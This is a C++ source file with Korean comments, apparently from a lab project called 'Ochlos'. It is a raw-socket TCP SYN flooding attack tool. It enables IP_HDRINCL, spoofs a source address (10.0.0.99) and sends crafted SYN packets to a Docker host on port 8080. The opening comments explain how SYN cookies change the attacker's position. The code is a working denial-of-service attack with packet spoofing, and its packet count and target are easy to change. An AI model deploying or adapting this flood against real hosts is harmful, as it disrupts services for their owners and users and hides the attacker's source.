// 기존의 tcp_syn_flooding.cpp의 경우 connect()를 사용하기 때문에 3-way handshake를 수행
// 그로 인한 스레드 폭증이나 socket&FD 고갈 문제 발생

// raw tcp syn flooding 공격의 경우, 이전에는 수신한 syn packet을 메모리에 저장 하였다.
// 하지만 현재에는 SYN을 수신 받으면, 거기에 **ISN(암호화된 번호표)** 를 다시 재전송 한다.
// 이게 존재하기 때문에, 공격자는 이제 2가지 딜레마에 빠지게 되는데
// 1. 공격자 자신을 숨기기 위해서 출발지 ip spoofing을 하게 되면, victim이 다시 보내는 ISN을 받지 못하기 때문에, 이후 ACK를 보내도 victim이 바로바로 차단을 할 수 있다.
// 2. ISN을 수신하기 위해서 src ip spoofing을 하지 않게 되면, victim의 방화벽 단에서 공격자가 누구인지 확인이 바로 가능하기 때문에 공격 수행이 불가능해진다.

// raw sock를 사용하는 방식으로 진행

#include "../include/ochlos_net.hpp"
#include <chrono>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <netinet/in.h>
#ifndef _WIN32
#include <netdb.h>
#include <unistd.h>
#endif
#include <thread>

int main() {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }
    using SocketHandle = SOCKET;
    const SocketHandle kInvalidSocket = INVALID_SOCKET;
#else
    using SocketHandle = int;
    const SocketHandle kInvalidSocket = -1;
#endif

    std::cout << "[Ochlos] Raw TCP SYN Flooding Attack Tool Started.\n";

    // 1. Create Raw Socket for TCP protocol
    SocketHandle sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == kInvalidSocket) {
        std::cerr << "[-] Raw socket creation failed. (Check root/CAP_NET_RAW privileges)\n";
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

    // 2. Set IP_HDRINCL(IP HeaDeR INCLude) option : 데이터 버퍼 맨 앞에 ip header가 포함되어 있다는 의미
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, reinterpret_cast<const char *>(&one), sizeof(one)) < 0) {
        std::cerr << "[-] setsockopt(IP_HDRINCL) failed\n";
        return 1;
    }

    // [L3 DNS 해석] docker에서 window의 도메인을 host.docker.internal 이라고 지칭하기 때문에 그걸 IPv4로 전환해준다.
    const char *target_host = "host.docker.internal";
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(target_host, nullptr, &hints, &res) != 0 || res == nullptr) {
        std::cerr << "[-] Failed to resolve target host: " << target_host << "\n";
        return 1;
    }

    // .s_addr's type = in_addr_t = (typedef __uint32_t in_addr_t)
    uint32_t dst_ip = reinterpret_cast<struct sockaddr_in *>(res->ai_addr)->sin_addr.s_addr;

    freeaddrinfo(res);

    uint32_t src_ip = 0;
    inet_pton(AF_INET, "10.0.0.99", &src_ip);
    uint16_t dst_port = 8080;

    // 7. dest addr에 대한 주소 구조체(sockaddr_in) 설정
    struct sockaddr_in target_addr;
    std::memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(dst_port);
    target_addr.sin_addr.s_addr = dst_ip;

    // 8. Send Raw TCP SYN packet
    // std::cout << "[Ochlos] Sending Raw TCP SYN packet to host.docker.internal:8080...\n";
    // int sent_bytes = sendto(sock, packet_buffer, sizeof(packet_buffer), 0, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr));

    // 8-1. 반복적으로 전송
    // 동일한 src,dst,seq로 전송하면 docker의 NAT에서 재전송 처리를 하기 때문에 동일 세션에서 묶어서 보내버리기 때문에 의도와 다르게 작동하게 된다.
    const int repeat_count = 10;
    std::cout << "[Ochlos] Sending " << repeat_count << " Raw TCP SYN packets to host.docker.internal:8080...\n";

    char packet_buffer[sizeof(IPHeader) + sizeof(TCPHeader)];

    for (int i = 0; i < repeat_count; i++) {
        // each loop, diff port
        uint16_t src_port = 10000 + i;
        craft_tcp_packet(packet_buffer, src_ip, dst_ip, src_port, dst_port, FLAG_SYN, i * 1000);

        int sent_bytes = sendto(sock, packet_buffer, sizeof(packet_buffer), 0, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr));

        if (sent_bytes < 0) {
#ifdef _WIN32
            std::cerr << "[-] sendto() failed. WSA Error COde: " << WSAGetLastError() << "\n";
#else
            std::cerr << "[-] sendto() failed. errno: " << errno << " (" << strerror(errno) << ")\n";
#endif
            break;
        }
    }

    std::cout << "[+] Completed sending " << repeat_count << " packets.\n";

// 9. 다 끝나고 나서 socket resource 정리
#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif

    return 0;
}